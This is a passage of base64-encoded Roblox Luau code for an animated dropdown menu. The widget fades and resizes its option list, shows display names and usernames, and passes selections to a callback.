gaWYgbm90IGxpc3QuVmlzaWJsZSB0aGVuCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24sIFR3ZWVuSW5mby5uZXcoMC4yKSwgewogICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgIH0pOlBsYXkoKQogICAgICAgICAgICBob3ZlclNvdW5kOlBsYXkoKQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIERyb3Bkb3duLk1vdXNlTGVhdmU6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgbm90IGxpc3QuVmlzaWJsZSB0aGVuCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24sIFR3ZWVuSW5mby5uZXcoMC4yKSwgewogICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCiAgICAgICAgICAgIH0pOlBsYXkoKQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIGxvY2FsIERlYm91bmNlID0gZmFsc2UKCiAgICAtLSBGYWRlIG9wdGlvbnMgaGVscGVyOiBmYWRlSW4gPSB0cnVlIGZhZGVzIGluLCBmYWxzZSBmYWRlcyBvdXQKICAgIGxvY2FsIGZ1bmN0aW9uIEZhZGVPcHRpb25zKG9wdGlvbnMsIGZhZGVJbiwgZHVyYXRpb24pCiAgICAgICAgZHVyYXRpb24gPSBkdXJhdGlvbiBvciBBbmltYXRpb25TZXR0aW5ncy5GYWRlRHVyYXRpb24KICAgICAgICBsb2NhbCB0b3RhbER1cmF0aW9uID0gZHVyYXRpb24KCiAgICAgICAgZm9yIF8sIG9wdGlvbiBpbiBpcGFpcnMob3B0aW9ucykgZG8KICAgICAgICAgICAgaWYgb3B0aW9uLkNsYXNzTmFtZSA9PSAiVGV4dEJ1dHRvbiIgdGhlbgogICAgICAgICAgICAgICAgLS0gU2V0IGluaXRpYWwgdHJhbnNwYXJlbmNpZXMKICAgICAgICAgICAgICAgIG9wdGlvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gZmFkZUluIGFuZCAxIG9yIDAuOQogICAgICAgICAgICAgICAgZm9yIF8sIGNoaWxkIGluIGlwYWlycyhvcHRpb246R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBjaGlsZC5DbGFzc05hbWUgPT0gIlRleHRMYWJlbCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBjaGlsZC5UZXh0VHJhbnNwYXJlbmN5ID0gZmFkZUluIGFuZCAxIG9yIDAKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIC0tIENyZWF0ZSB0d2VlbiBmb3IgdGhpcyBvcHRpb24KICAgICAgICAgICAgICAgIGxvY2FsIHR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShvcHRpb24sIFR3ZWVuSW5mby5uZXcoZHVyYXRpb24sIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IGZhZGVJbiBhbmQgMC45IG9yIDEKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB0d2VlbjpQbGF5KCkKICAgICAgICAgICAgICAgIGZvciBfLCBjaGlsZCBpbiBpcGFpcnMob3B0aW9uOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgY2hpbGQuQ2xhc3NOYW1lID09ICJUZXh0TGFiZWwiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShjaGlsZCwgVHdlZW5JbmZvLm5ldyhkdXJhdGlvbiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRUcmFuc3BhcmVuY3kgPSBmYWRlSW4gYW5kIDAgb3IgMQogICAgICAgICAgICAgICAgICAgICAgICB9KTpQbGF5KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgcmV0dXJuIHRvdGFsRHVyYXRpb24KICAgIGVuZAoKICAgIC0tIEZ1bmN0aW9uIHRvIGFkanVzdCBwb3NpdGlvbnMgb2Ygc2libGluZyBlbGVtZW50cwogICAgbG9jYWwgZnVuY3Rpb24gQWRqdXN0U2libGluZ1Bvc2l0aW9ucyhwYXJlbnQsIGN1cnJlbnREcm9wZG93biwgb2Zmc2V0LCBkdXJhdGlvbikKICAgICAgICBsb2NhbCBzaWJsaW5ncyA9IHBhcmVudDpHZXRDaGlsZHJlbigpCiAgICAgICAgbG9jYWwgbGF5b3V0T3JkZXIgPSBjdXJyZW50RHJvcGRvd24uTGF5b3V0T3JkZXIgb3IgMAogICAgICAgIGZvciBfLCBzaWJsaW5nIGluIGlwYWlycyhzaWJsaW5ncykgZG8KICAgICAgICAgICAgaWYgc2libGluZzpJc0EoIkd1aU9iamVjdCIpIGFuZCBzaWJsaW5nIH49IGN1cnJlbnREcm9wZG93biBhbmQgKHNpYmxpbmcuTGF5b3V0T3JkZXIgb3IgMCkgPiBsYXlvdXRPcmRlciB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBjdXJyZW50UG9zID0gc2libGluZy5Qb3NpdGlvbgogICAgICAgICAgICAgICAgbG9jYWwgbmV3UG9zID0gVURpbTIubmV3KGN1cnJlbnRQb3MuWC5TY2FsZSwgY3VycmVudFBvcy5YLk9mZnNldCwgY3VycmVudFBvcy5ZLlNjYWxlLCBjdXJyZW50UG9zLlkuT2Zmc2V0ICsgb2Zmc2V0KQogICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShzaWJsaW5nLCBUd2VlbkluZm8ubmV3KGR1cmF0aW9uLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwgewogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gbmV3UG9zCiAgICAgICAgICAgICAgICB9KTpQbGF5KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBEcm9wZG93bi5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSB+PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIG9yIERlYm91bmNlIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIERlYm91bmNlID0gdHJ1ZQogICAgICAgIGNsaWNrU291bmQ6UGxheSgpCgogICAgICAgIGlmIGxpc3QuVmlzaWJsZSB0aGVuCiAgICAgICAgICAgIC0tIEZhZGUgb3V0IGFsbCBvcHRpb25zIGF0IG9uY2UKICAgICAgICAgICAgbG9jYWwgZmFkZUR1cmF0aW9uID0gRmFkZU9wdGlvbnMobGlzdDpHZXRDaGlsZHJlbigpLCBmYWxzZSkKCiAgICAgICAgICAgIC0tIEFmdGVyIGZhZGUgb3V0LCBoaWRlIGxpc3QgYW5kIHNocmluayBkcm9wZG93bgogICAgICAgICAgICB0YXNrLmRlbGF5KGZhZGVEdXJhdGlvbiwgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbGlzdC5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgIGxpc3QuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDApIC0tIFJlc2V0IGxpc3Qgc2l6ZQogICAgICAgICAgICAgICAgbG9jYWwgc2hyaW5rVHdlZW4gPSBUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLCBUd2VlbkluZm8ubmV3KEFuaW1hdGlvblNldHRpbmdzLkV4cGFuZER1cmF0aW9uLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMS4wMywgLTEwLCAwLCA0NSl9KQogICAgICAgICAgICAgICAgbG9jYWwgdG9nZ2xlVHdlZW4gPSBUd2VlblNlcnZpY2U6Q3JlYXRlKHRvZ2dsZSwgVHdlZW5JbmZvLm5ldyhBbmltYXRpb25TZXR0aW5ncy5Ub2dnbGVSb3RhdGlvbkR1cmF0aW9uLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1JvdGF0aW9uID0gMTgwfSkKICAgICAgICAgICAgICAgIC0tIE1vdmUgc2libGluZ3MgYmFjayB1cAogICAgICAgICAgICAgICAgQWRqdXN0U2libGluZ1Bvc2l0aW9ucyhjdXJyZW50UGFnZSwgRHJvcGRvd24sIC0oI0Ryb3Bkb3duU2V0dGluZ3MuT3B0aW9ucyAqICg0MCArIDIpIC0gKERyb3Bkb3duU2V0dGluZ3MuT3B0aW9uc1sxXSBhbmQgMiBvciAwKSksIEFuaW1hdGlvblNldHRpbmdzLkV4cGFuZER1cmF0aW9uKQogICAgICAgICAgICAgICAgc2hyaW5rVHdlZW46UGxheSgpCiAgICAgICAgICAgICAgICB0b2dnbGVUd2VlbjpQbGF5KCkKICAgICAgICAgICAgICAgIHNocmlua1R3ZWVuLkNvbXBsZXRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBEZWJvdW5jZSA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIC0tIFNob3cgbGlzdCBhbmQgZXhwYW5kIGRyb3Bkb3duCiAgICAgICAgICAgIGxpc3QuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgLS0gU2V0IG9wdGlvbnMgZnVsbHkgdHJhbnNwYXJlbnQgYmVmb3JlIGZhZGUgaW4KICAgICAgICAgICAgZm9yIF8sIG9wdGlvbiBpbiBpcGFpcnMobGlzdDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgaWYgb3B0aW9uLkNsYXNzTmFtZSA9PSAiVGV4dEJ1dHRvbiIgdGhlbgogICAgICAgICAgICAgICAgICAgIG9wdGlvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBjaGlsZCBpbiBpcGFpcnMob3B0aW9uOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoaWxkLkNsYXNzTmFtZSA9PSAiVGV4dExhYmVsIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGlsZC5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIG9wdGlvbkNvdW50ID0gI0Ryb3Bkb3duU2V0dGluZ3MuT3B0aW9ucwogICAgICAgICAgICBsb2NhbCBsaXN0SGVpZ2h0ID0gb3B0aW9uQ291bnQgKiAoNDAgKyAyKSAtIChvcHRpb25Db3VudCA+IDAgYW5kIDIgb3IgMCkgLS0gNDAgcGVyIG9wdGlvbiArIDIgcGFkZGluZywgbWludXMgcGFkZGluZyBmb3IgbGFzdCBvcHRpb24KICAgICAgICAgICAgbG9jYWwgbmV3SGVpZ2h0ID0gNDUgKyBsaXN0SGVpZ2h0CiAgICAgICAgICAgIGxpc3QuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIGxpc3RIZWlnaHQpIC0tIFNldCBsaXN0IHNpemUgYmFzZWQgb24gb3B0aW9ucwogICAgICAgICAgICBsb2NhbCBleHBhbmRUd2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24sIFR3ZWVuSW5mby5uZXcoQW5pbWF0aW9uU2V0dGluZ3MuRXhwYW5kRHVyYXRpb24sIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygxLjAzLCAtMTAsIDAsIG5ld0hlaWdodCl9KQogICAgICAgICAgICBsb2NhbCB0b2dnbGVUd2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUodG9nZ2xlLCBUd2VlbkluZm8ubmV3KEFuaW1hdGlvblNldHRpbmdzLlRvZ2dsZVJvdGF0aW9uRHVyYXRpb24sIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7Um90YXRpb24gPSAwfSkKCiAgICAgICAgICAgIC0tIE1vdmUgc2libGluZ3MgZG93biBiYXNlZCBvbiBudW1iZXIgb2Ygb3B0aW9ucwogICAgICAgICAgICBBZGp1c3RTaWJsaW5nUG9zaXRpb25zKGN1cnJlbnRQYWdlLCBEcm9wZG93biwgbGlzdEhlaWdodCwgQW5pbWF0aW9uU2V0dGluZ3MuRXhwYW5kRHVyYXRpb24pCgogICAgICAgICAgICBleHBhbmRUd2VlbjpQbGF5KCkKICAgICAgICAgICAgdG9nZ2xlVHdlZW46UGxheSgpCgogICAgICAgICAgICBleHBhbmRUd2Vlbi5Db21wbGV0ZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAtLSBGYWRlIGluIGFsbCBvcHRpb25zIGF0IG9uY2UKICAgICAgICAgICAgICAgIGxvY2FsIGZhZGVEdXJhdGlvbiA9IEZhZGVPcHRpb25zKGxpc3Q6R2V0Q2hpbGRyZW4oKSwgdHJ1ZSkKICAgICAgICAgICAgICAgIHRhc2suZGVsYXkoZmFkZUR1cmF0aW9uLCBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgRGVib3VuY2UgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgLS0gVW5pZmllZCBTZXREcm9wZG93bk9wdGlvbnMgZnVuY3Rpb24KICAgIGxvY2FsIGZ1bmN0aW9uIFNldERyb3Bkb3duT3B0aW9ucyhzZXR0aW5ncykKICAgICAgICBpZiBub3Qgc2V0dGluZ3MuT3B0aW9ucyB0aGVuCiAgICAgICAgICAgIHNldHRpbmdzLk9wdGlvbnMgPSB7fSAtLSBFbnN1cmUgT3B0aW9ucyBpcyBhbHdheXMgYSB0YWJsZQogICAgICAgIGVuZAoKICAgICAgICBmb3IgXywgT3B0aW9uIGluIGlwYWlycyhzZXR0aW5ncy5PcHRpb25zKSBkbwogICAgICAgICAgICAtLSBQYXJzZSBEaXNwbGF5TmFtZSBhbmQgdXNlcm5hbWUgZnJvbSB0aGUgb3B0aW9uIHN0cmluZwogICAgICAgICAgICBsb2NhbCBkaXNwbGF5TmFtZSwgdXNlcm5hbWUgPSBPcHRpb246bWF0Y2goIihbXlxuXSspXG4oQC4rKSIpCiAgICAgICAgICAgIGlmIG5vdCBkaXNwbGF5TmFtZSB0aGVuIGRpc3BsYXlOYW1lID0gT3B0aW9uIGVuZAoKICAgICAgICAgICAgbG9jYWwgRHJvcGRvd25PcHRpb24gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgICAgICBEcm9wZG93bk9wdGlvbi5OYW1lID0gT3B0aW9uCiAgICAgICAgICAgIERyb3Bkb3duT3B0aW9uLlNpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCA0MCkKICAgICAgICAgICAgRHJvcGRvd25PcHRpb24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCiAgICAgICAgICAgIERyb3Bkb3duT3B0aW9uLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIERyb3Bkb3duT3B0aW9uLlRleHQgPSAiIgogICAgICAgICAgICBEcm9wZG93bk9wdGlvbi5QYXJlbnQgPSBzZXR0aW5ncy5saXN0CiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgRHJvcGRvd25PcHRpb24uWkluZGV4ID0gNSBlbmQpCgogICAgICAgICAgICBsb2NhbCBvcHRpb25Db3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRHJvcGRvd25PcHRpb24pCiAgICAgICAgICAgIG9wdGlvbkNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KQoKICAgICAgICAgICAgLS0gRGlzcGxheU5hbWUgbGFiZWwKICAgICAgICAgICAgbG9jYWwgZGlzcGxheU5hbWVMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICAgICAgZGlzcGxheU5hbWVMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIC0xMCwgMCwgMjApCiAgICAgICAgICAgIGRpc3BsYXlOYW1lTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgNSwgMCwgMikKICAgICAgICAgICAgZGlzcGxheU5hbWVMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICBkaXNwbGF5TmFtZUxhYmVsLlRleHQgPSBkaXNwbGF5TmFtZSBvciBPcHRpb24KICAgICAgICAgICAgZGlzcGxheU5hbWVMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgZGlzcGxheU5hbWVMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgICAgICAgICBkaXNwbGF5TmFtZUxhYmVsLlRleHRTaXplID0gMTYKICAgICAgICAgICAgZGlzcGxheU5hbWVMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgICAgICBkaXNwbGF5TmFtZUxhYmVsLlBhcmVudCA9IERyb3Bkb3duT3B0aW9uCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgZGlzcGxheU5hbWVMYWJlbC5aSW5kZXggPSA2IGVuZCkKCiAgICAgICAgICAgIC0tIFVzZXJuYW1lIGxhYmVsCiAgICAgICAgICAgIGxvY2FsIHVzZXJuYW1lTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgICAgIHVzZXJuYW1lTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDE2KQogICAgICAgICAgICB1c2VybmFtZUxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDUsIDAsIDIyKQogICAgICAgICAgICB1c2VybmFtZUxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIHVzZXJuYW1lTGFiZWwuVGV4dCA9IHVzZXJuYW1lIG9yICIiCiAgICAgICAgICAgIHVzZXJuYW1lTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApCiAgICAgICAgICAgIHVzZXJuYW1lTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgdXNlcm5hbWVMYWJlbC5UZXh0U2l6ZSA9IDEyCiAgICAgICAgICAgIHVzZXJuYW1lTGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICAgICAgdXNlcm5hbWVMYWJlbC5QYXJlbnQgPSBEcm9wZG93bk9wdGlvbgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIHVzZXJuYW1lTGFiZWwuWkluZGV4ID0gNiBlbmQpCgogICAgICAgICAgICBEcm9wZG93bk9wdGlvbi5Nb3VzZUVudGVyOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgZm9yIF8sIG9wdGlvbiBpbiBpcGFpcnMoc2V0dGluZ3MubGlzdDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIG9wdGlvbi5DbGFzc05hbWUgPT0gIlRleHRCdXR0b24iIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRhYmxlLmZpbmQoc2V0dGluZ3MuQ3VycmVudE9wdGlvbiwgb3B0aW9uLk5hbWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUob3B0aW9uLCBUd2VlbkluZm8ubmV3KEFuaW1hdGlvblNldHRpbmdzLlNlbGVjdGlvblRyYW5zaXRpb25EdXJhdGlvbiwgRW51bS5FYXNpbmdTdHlsZS5TaW5lLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTpQbGF5KCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIG5vdCB0YWJsZS5maW5kKHNldHRpbmdzLkN1cnJlbnRPcHRpb24sIE9wdGlvbikgdGhlbgogICAgICAgICAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd25PcHRpb24sIFR3ZWVuSW5mby5uZXcoQW5pbWF0aW9uU2V0dGluZ3MuU2VsZWN0aW9uVHJhbnNpdGlvbkR1cmF0aW9uLCBFbnVtLkVhc2luZ1N0eWxlLlNpbmUsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgICAgICAgICAgICAgfSk6UGxheSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGhvdmVyU291bmQ6UGxheSgpCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIERyb3Bkb3duT3B0aW9uLk1vdXNlTGVhdmU6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBub3QgdGFibGUuZmluZChzZXR0aW5ncy5DdXJyZW50T3B0aW9uLCBPcHRpb24pIHRoZW4KICAgICAgICAgICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duT3B0aW9uLCBUd2VlbkluZm8ubmV3KEFuaW1hdGlvblNldHRpbmdzLlNlbGVjdGlvblRyYW5zaXRpb25EdXJhdGlvbiwgRW51bS5FYXNpbmdTdHlsZS5TaW5lLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQogICAgICAgICAgICAgICAgICAgIH0pOlBsYXkoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIERyb3Bkb3duT3B0aW9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgY2xpY2tTb3VuZDpQbGF5KCkKICAgICAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQoc2V0dGluZ3MuQ3VycmVudE9wdGlvbiwgT3B0aW9uKSBhbmQgbm90IHNldHRpbmdzLk11bHRpcGxlT3B0aW9ucyB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiB0YWJsZS5maW5kKHNldHRpbmdzLkN1cnJlbnRPcHRpb24sIE9wdGlvbikgdGhlbgogICAgICAgICAgICAgICAgICAgIHRhYmxlLnJlbW92ZShzZXR0aW5ncy5DdXJyZW50T3B0aW9uLCB0YWJsZS5maW5kKHNldHRpbmdzLkN1cnJlbnRPcHRpb24sIE9wdGlvbikpCiAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93bk9wdGlvbiwgVHdlZW5JbmZvLm5ldyhBbmltYXRpb25TZXR0aW5ncy5TZWxlY3Rpb25UcmFuc2l0aW9uRHVyYXRpb24sIEVudW0uRWFzaW5nU3R5bGUuU2luZSwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwgewogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksCiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgfSk6UGxheSgpCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHNldHRpbmdzLk11bHRpcGxlT3B0aW9ucyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmNsZWFyKHNldHRpbmdzLkN1cnJlbnRPcHRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBvcHRpb24gaW4gaXBhaXJzKHNldHRpbmdzLmxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wdGlvbi5DbGFzc05hbWUgPT0gIlRleHRCdXR0b24iIGFuZCBvcHRpb24gfj0gRHJvcGRvd25PcHRpb24gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUob3B0aW9uLCBUd2VlbkluZm8ubmV3KEFuaW1hdGlvblNldHRpbmdzLlNlbGVjdGlvblRyYW5zaXRpb25EdXJhdGlvbiwgRW51bS5FYXNpbmdTdHlsZS5TaW5lLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTpQbGF5KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoc2V0dGluZ3MuQ3VycmVudE9wdGlvbiwgT3B0aW9uKQogICAgICAgICAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd25PcHRpb24sIFR3ZWVuSW5mby5uZXcoQW5pbWF0aW9uU2V0dGluZ3MuU2VsZWN0aW9uVHJhbnNpdGlvbkR1cmF0aW9uLCBFbnVtLkVhc2luZ1N0eWxlLlNpbmUsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMTAwLCAxMDApLAogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC43CiAgICAgICAgICAgICAgICAgICAgfSk6UGxheSgpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBzZWxlY3RlZC5UZXh0ID0gc2V0dGluZ3MuTXVsdGlwbGVPcHRpb25zIGFuZCAoI3NldHRpbmdzLkN1cnJlbnRPcHRpb24gPiAxIGFuZCAiVmFyaW91cyIgb3Igc2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXSBvciAiTm9uZSIpIG9yIHNldHRpbmdzLkN1cnJlbnRPcHRpb25bMV0gb3IgIk5vbmUiCgogICAgICAgICAgICAgICAgaWYgdHlwZW9mKHNldHRpbmdzLkNhbGxiYWNrKSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHNldHRpbmdzLkNhbGxiYWNrKHNldHRpbmdzLkN1cnJlbnRPcHRpb24pCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgd2FybigiQ2FsbGJhY2sgZXJyb3IgZm9yICIgLi4gc2V0dGluZ3MuTmFtZSAuLiAiOiAiIC4uIHRvc3RyaW5nKGVycikpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBub3Qgc2V0dGluZ3MuTXVsdGlwbGVPcHRpb25zIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBmYWRlRHVyYXRpb24gPSBGYWRlT3B0aW9ucyhzZXR0aW5ncy5saXN0OkdldENoaWxkcmVuKCksIGZhbHNlKQogICAgICAgICAgICAgICAgICAgIHRhc2suZGVsYXkoZmFkZUR1cmF0aW9uLCBmdW5jdGlvbigpCiAgICAgICAgICAgI